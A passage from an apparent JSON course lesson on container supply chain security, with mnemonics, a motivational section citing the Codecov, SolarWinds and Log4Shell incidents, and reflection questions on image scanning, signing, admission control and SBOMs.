vars)\n\nVisual Memory Technique:\n\nPicture a shipping container:\n- Container contents = Your app + dependencies\n- Seal on container = Image signature (verify not tampered)\n- Inspection at port = Vulnerability scanning\n- Customs clearance = Admission control\n- Manifest = SBOM (list of what's inside)\n- Lock on container = Encryption\n- GPS tracker = Logging/monitoring\n\nJust like physical shipping, you need multiple security layers.\n\n13. Image Size Comparison: 'ADU'\n    A - Alpine (~5MB)\n    D - Distroless (~20MB)\n    U - Ubuntu (~70MB)\n\n    Smaller = fewer packages = fewer CVEs\n\n14. When to Rebuild Images:\n    Memory Hook: 'CVE-MAP'\n    C - CVE discovered in base image\n    V - (New) Version of dependency with security fix\n    E - Expiration of secrets/certs in image\n    M - Monthly (regular rebuild cadence)\n    A - After security incident\n    P - (Before) Production deployment\n\n15. Docker Content Trust: 'SIGN & VERIFY'\n    SIGN - Build â†’ Scan â†’ Sign â†’ Push\n    VERIFY - Pull â†’ Verify signature â†’ Deploy\n\n    Set DOCKER_CONTENT_TRUST=1 to enforce"
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "title": "Mastering Container Supply Chain Security",
        "text": "Container security might feel overwhelming. There are so many tools, so many vulnerabilities, so many ways things can go wrong. CVEs discovered daily. New attack techniques. It's easy to feel like you're playing whack-a-mole.\n\nBut here's the reality: Container supply chain security is where most breaches happen, and where you can have the biggest impact.\n\nThink about it:\n- Codecov breach: Affected HashiCorp, Twilio, Rapid7, hundreds of Fortune 500 companies\n- SolarWinds: Compromised supply chain affected 18,000+ organizations\n- Log4Shell: One vulnerability in one library affected millions of applications\n\nThese weren't sophisticated zero-days. These were supply chain compromises - attacking the build and deployment pipeline rather than the application itself.\n\nYou're Learning the Future of Security:\n\nTraditional security: Perimeter defense (firewalls, IDS)\nModern security: Supply chain integrity (verify everything from source to deployment)\n\nEvery container image is built from:\n- Base image (who verified it?)\n- Dependencies (do you know what's included?)\n- Build tools (are they compromised?)\n- CI/CD pipeline (does it have too many permissions?)\n- Registry (is it secure?)\n\nYou're learning to secure all of these.\n\nThe Skill That Sets You Apart:\n\nMost developers know how to write Dockerfiles. Many know how to build container images. Few understand how to secure the entire supply chain.\n\nThat's your competitive advantage.\n\nWhen you can:\n- Analyze a container image and identify every vulnerability\n- Trace a CVE back to the specific package and version\n- Design a CI/CD pipeline that blocks vulnerable images\n- Implement image signing and verification\n- Generate SBOMs and track supply chain risk\n\nYou're not just a security practitioner - you're a supply chain security engineer. And that's increasingly valuable.\n\nThe Mindset Shift: 'Assume Breach':\n\nYou can't prevent all vulnerabilities. New CVEs are discovered daily. What you can do:\n\n1. Minimize attack surface (alpine instead of ubuntu)\n2. Detect vulnerabilities early (scan on push)\n3. Prevent deployment of critical vulnerabilities (admission control)\n4. Verify integrity (image signing)\n5. Monitor continuously (detect new CVEs)\n6. Respond quickly (automated remediation)\n\nThis is defense in depth. Each layer compensates for failures in others.\n\nFrom Overwhelming to Actionable:\n\nRight now, you might be thinking:\n'There are 45 HIGH and 12 CRITICAL CVEs in my image. Where do I even start?'\n\nThe answer: Start with the base image.\n\n90% of CVEs come from packages you don't need. Switching from ubuntu:latest to alpine often eliminates 80%+ of CVEs immediately. Then focus on the remaining vulnerabilities in packages you actually use.\n\nIt's not about achieving zero vulnerabilities (impossible). It's about achieving acceptable risk for your threat model.\n\nReal-World Impact:\n\nThe skills you're learning directly translate to:\n- Preventing breaches (Codecov, SolarWinds)\n- Faster incident response (SBOM tells you what's affected)\n- Compliance (PCI-DSS, SOC 2, FedRAMP require supply chain security)\n- Cost savings (automated scanning vs manual security reviews)\n\nOne properly configured ECR repository can prevent a multi-million dollar breach.\n\nThe Journey Ahead:\n\nYou've learned:\n- Container vulnerabilities and CVE analysis\n- Image scanning automation\n- Registry security (ECR, ACR, GCR)\n- Image signing and verification\n- Supply chain attack analysis (Codecov)\n- Admission control policies\n- SBOM generation\n\nNext, you'll combine this with:\n- Runtime security (protecting running containers)\n- Kubernetes security (cluster-level controls)\n- Zero trust networking (micro-segmentation)\n\nEach piece builds on the last. You're becoming a complete cloud security engineer.\n\nYour Challenge This Week:\n\n1. Take an existing Dockerfile (your project or open source)\n2. Scan it: docker scan or trivy\n3. Note the CVE count and severity\n4. Rebuild with alpine or distroless base\n5. Rescan and compare\n6. Implement one admission control policy\n7. Generate an SBOM\n\nDoing this ONCE will teach you more than reading this lesson three times.\n\nThe Security Industry Needs You:\n\nThere's a massive shortage of people who understand:\n- Container security at scale\n- Supply chain risk management\n- DevSecOps automation\n- Cloud-native security\n\nEvery organization moving to containers needs these skills. That's millions of workloads that need securing.\n\nYou're not just learning for yourself. You're learning to protect organizations from the next Codecov, the next SolarWinds, the next Log4Shell.\n\nKeep building. Keep securing. Keep learning.\n\nSee you in the next lesson: Cloud-Native Security Tools & CSPM."
      }
    },
    {
      "type": "reflection",
      "content": {
        "title": "Container Supply Chain Security Reflection",
        "text": "Reflect on your understanding of container supply chain security:\n\n1. Base Image Selection:\n   - Why does using ubuntu:latest result in more CVEs than alpine? List three specific reasons.\n   - You need to run a Python app. Compare security implications of: python:3.11, python:3.11-alpine, python:3.11-slim, distroless Python base.\n   - What's the risk of using 'latest' tags in production? How does image digest pinning solve this?\n\n2. Docker Layer Security:\n   - You add AWS credentials in layer 5, then delete them in layer 6. Can an attacker still extract them? How?\n   - What command would you use to inspect all layers of an image?\n   - How do multi-stage builds prevent secrets from ending up in the final image?\n\n3. Vulnerability Scanning:\n   - Your image has 2 CRITICAL, 5 HIGH, 12 MEDIUM, 20 LOW CVEs. Which should block deployment? Why?\n   - A CVE is reported in a package you don't actually use (installed as dependency). Is it still a risk?\n   - How often should you rebuild images even if code hasn't changed? Why?\n\n4. Image Signing:\n   - Explain the purpose of image signing in one sentence to a non-technical manager.\n   - What attack does Docker Content Trust prevent?\n   - If an attacker compromises your ECR and replaces an image, how does signature verification detect this?\n\n5. Codecov Breach Analysis:\n   - List three specific container security controls that would have mitigated the Codecov breach.\n   - How do network policies prevent data exfiltration from build containers?\n   - Why should CI/CD pipelines not have production AWS credentials?\n\n6. ECR Security:\n   - You enable scanOnPush in ECR. What happens if an image has CRITICAL CVEs?\n   - What's the purpose of IMMUTABLE image tags? What attack does it prevent?\n   - How does ECR encryption with KMS improve security over default encryption?\n\n7. Admission Control:\n   - Write a policy (in plain English) that would have blocked the Tesla cryptomining attack.\n   - What's the difference between validating admission control and mutating admission control?\n   - Can admission control prevent deployment of images from compromised registries? How?\n\n8. Supply Chain Attacks:\n   - Name three stages in the container supply chain where attacks can occur.\n   - How does SBOM help in responding to a newly discovered CVE like Log4Shell?\n   - What's the difference between dependency confusion and typosquatting?\n\n9. Practical Scenarios:\n   - You're building a startup with 5 microservices. Design the container security architecture (registry, scanning, signing, deployment policies).\n   - A security scan reports secrets in your image layers. Walk through complete remediation (6 steps minimum).\n   - Your boss says 'fixing CVEs slows down development.' How do you respond?\n\n10. Multi-Stage Builds:\n    - Why is the final stage of a multi-stage build smaller than the build stage?\n    - What goes in the build stage that doesn't go in the final stage?\n    - How do multi-stage builds improve both security and performance?\n\n11. Real-World Application:\n    - You're migrating 50 legacy applications to containers. 30 use ubuntu:latest with 100+ CVEs each. What's your 90-day remediation plan?\n    - A new CRITICAL CVE is announced in OpenSSL. How do you identify which of your 200 container images are affected?\n    - Compliance requires 'all container images must be scanned and signed.' How do you enforce this technically (not just policy)?\n\n12. Knowledge Gaps:\n    - What concepts still feel unclear?\n    - What hands-on exercise would solidify your understanding?\n    - What supply chain security topic would you like to explore deeper?\n\n13. Next Steps:\n    - What will you build this week to practice these concepts?\n    - Which tool will you try first: Trivy, Snyk, Cosign, or OPA?\n    - What's the next container security topic you want to learn?\n\nWrite down your answers. The goal isn't to have perfect answers - it's to identify what you know solidly vs what needs more practice.\n\nRevisit this in a week after building and scanning actual container images. You'll be amazed at how much clearer everything becomes."
      }
    }
  ]
}